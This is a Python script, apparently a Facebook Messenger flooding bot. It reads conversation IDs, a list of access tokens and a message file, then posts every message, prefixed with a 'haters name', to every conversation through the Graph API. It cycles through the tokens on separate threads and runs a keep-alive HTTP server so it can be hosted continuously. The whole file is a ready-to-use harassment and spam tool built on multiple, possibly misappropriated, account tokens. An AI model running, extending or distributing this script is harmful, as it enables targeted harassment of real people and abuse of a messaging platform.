import requests
import json
import time
import os
import http.server
import socketserver
import threading
from platform import system

# Color Definitions
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    GRAY = '\033[90m'
    GOLD = '\033[93m'

# HTTP Server for Render
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Server is running successfully!")

# Additional Error Handling
def handle_errors(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            print(Color.RED + f"[x] Error: {e}")
            return None
    return wrapper

@handle_errors
def execute_server():
    PORT = int(os.environ.get('PORT', 4000))  # Use PORT environment variable for Render

    handler = MyHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(Color.GREEN + f"Server running at http://localhost:{PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(Color.RED + '\n[-] Server interrupted. Exiting...')

@handle_errors
def get_convo_ids():
    if not os.path.exists('convo.txt'):
        print(Color.RED + "[x] 'convo.txt' file not found!")
        return []
    with open('convo.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

@handle_errors
def send_messages(convo_ids):
    if not convo_ids:
        print(Color.RED + "[x] No conversation IDs found.")
        return

    if not os.path.exists('tokennum.txt'):
        print(Color.RED + "[x] 'tokennum.txt' file not found!")
        return

    with open('tokennum.txt', 'r') as file:
        access_tokens = [line.strip() for line in file.readlines()]

    if not os.path.exists('file.txt'):
        print(Color.RED + "[x] 'file.txt' file not found!")
        return

    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()

    if not os.path.exists(text_file_path):
        print(Color.RED + f"[x] Message file '{text_file_path}' not found!")
        return

    with open(text_file_path, 'r') as file:
        messages = file.readlines()

    if not access_tokens or not messages:
        print(Color.RED + "[x] No access tokens or messages available. Exiting...")
        return

    if not os.path.exists('hatersname.txt'):
        print(Color.RED + "[x] 'hatersname.txt' file not found!")
        return

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    if not os.path.exists('time.txt'):
        print(Color.RED + "[x] 'time.txt' file not found!")
        return

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }

    num_messages = len(messages)
    num_tokens = len(access_tokens)

    token_index = 0  # To cycle through tokens

    # Send messages in round-robin using tokens
    for message_index in range(num_messages):
        message = messages[message_index].strip()
        for convo_id in convo_ids:
            # Get the token in round-robin fashion
            token = access_tokens[token_index % num_tokens]
            threading.Thread(target=send_message, args=(token, convo_id, message, haters_name, headers)).start()

            # Move to the next token
            token_index += 1
            time.sleep(speed)  # Delay between each message

def send_message(token, convo_id, message, haters_name, headers):
    try:
        message_data = {
            'access_token': token,
            'message': f'{haters_name} {message}'
        }
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        response = requests.post(url, json=message_data, headers=headers)
        
        if response.ok:
            print(Color.GREEN + f"[+] Message to convo ID {convo_id} sent: {message}")
        else:
            print(Color.RED + f"[x] Failed to send message to convo ID {convo_id}: {response.text}")
    except Exception as e:
        print(Color.RED + f"[x] Error while sending message: {e}")

# Main Execution
if __name__ == "__main__":
    convo_ids = get_convo_ids()
    if convo_ids:
        print(Color.YELLOW + "[!] Starting message sending process.")
        send_messages(convo_ids)
    execute_server()
